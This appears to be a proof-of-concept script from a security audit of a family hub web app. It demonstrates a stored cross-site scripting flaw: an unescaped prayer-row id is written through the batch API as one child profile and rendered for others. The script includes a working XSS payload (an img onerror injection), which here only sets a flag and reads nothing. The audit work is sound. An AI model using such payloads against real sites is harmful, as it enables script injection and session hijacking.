// Stored XSS through a prayer row's `id` field. Titles, names and notes go through esc() (apps/prayer.html:717), but the
// row id is concatenated raw into attributes: rowHTML data-pray / data-open (845, 847), kidCardHTML data-kpray (1587),
// ansHTML data-open (935), the anniversary recall (925) and every data-update/-tell/-share/... in the sheet (1007-1017).
// The row key is 'prayer:<id>', but the id inside the value is free text, and the Worker stores any JSON value.
// Phase 2 stored its payloads in a family prayer *title* and viewed Home and the TV (02-shell.md §(4)); the Prayer app
// itself and the id field were not in that sweep.
// Step: as Ezra (a kid) — or any paired profile — write one family row with a crafted id through /api/data/prayer/batch
// (the same hand-made request P2-PROF-05 used). Then open Prayer as Kiara (kid: family list at once) and as Eli (tap Family).
// The payload only sets a flag in the page; it reads nothing.
// Run: node "audits/tools/phase3/prayer/xss-id.mjs" -> audits/evidence/p3/prayer/xss-id.json
import fs from 'node:fs';
import { local, sleep } from '../../lib/local.mjs';
const OUT = 'audits/evidence/p3/prayer';
const L = await local({ variant: 'typical', clock: 'real', engine: 'webkit' });
const res = {};
try {
  const payload = 'zz1"><img src="x:" onerror="window.__xss=(window.__xss||0)+1;window.__xssSaw=typeof localStorage.getItem(\'hub.session\')"><i x="';
  const value = { id: payload, title: 'Pray for the school play', for: '', phone: '', detail: '', category: 'Family', cadence: 'daily', days: [], status: 'active',
    createdAt: '2026-09-01', lastPrayedAt: null, answeredAt: null, answerNote: null, updates: [], sharedFrom: null, prayedBy: {}, updatedAt: new Date().toISOString() };
  const w = await L.apiAs('ezra', '/api/data/prayer/batch?scope=family', { method: 'POST', body: { items: [{ key: 'prayer:zz1', value, updated_at: Date.now() }] } });
  res.write = { status: w.status, body: w.body };
  console.log('write as ezra ->', w.status, JSON.stringify(w.body).slice(0, 160));
  for (const [profile, device, family] of [['kiara', 'ipad-portrait', false], ['eli', 'iphone-pwa', true]]) {
    const d = await L.device({ device, profile, fixedTime: false });
    const f = await d.openApp('prayer', { wait: '#todayLine' });
    await f.waitForFunction(() => document.getElementById('todayLine').textContent.trim().length > 0, null, { timeout: 10000 }); await sleep(1500);
    const before = await f.evaluate(() => ({ xss: window.__xss || 0, saw: window.__xssSaw || null }));
    let afterSwitch = null;
    if (family) {
      await f.click('#listSwitch [data-list="shared"]'); await sleep(1000);
      // save() throws on the row's key (hub.set's key check, apps/hub.js:234) before go('today') can repaint (1273-1274)
      afterSwitch = await f.evaluate(() => ({ xss: window.__xss || 0, activeList: D.activeList, headerPressed: document.querySelector('#listSwitch [aria-pressed="true"]').dataset.list }));
      afterSwitch.pageErrors = d.logs.filter(l => l.startsWith('pageerror')).map(l => l.slice(0, 90));
      await f.click('nav [data-go="today"]'); await sleep(800);          // any later repaint renders the family rows
    }
    const after = await f.evaluate(() => ({ xss: window.__xss || 0, saw: window.__xssSaw || null, liveImgs: document.querySelectorAll('img[onerror]').length }));
    res[profile] = { onOpen: before, afterSwitch, after };
    console.log(profile, 'on open:', JSON.stringify(before), family ? '| right after tapping Family: ' + JSON.stringify(afterSwitch) + ' | after tapping nav Today: ' + JSON.stringify(after) : '| ' + JSON.stringify(after));
    await d.close();
  }
} catch (e) { console.error(e); res.error = String(e.stack || e); }
finally { fs.writeFileSync(`${OUT}/xss-id.json`, JSON.stringify(res, null, 1)); await L.close(); }
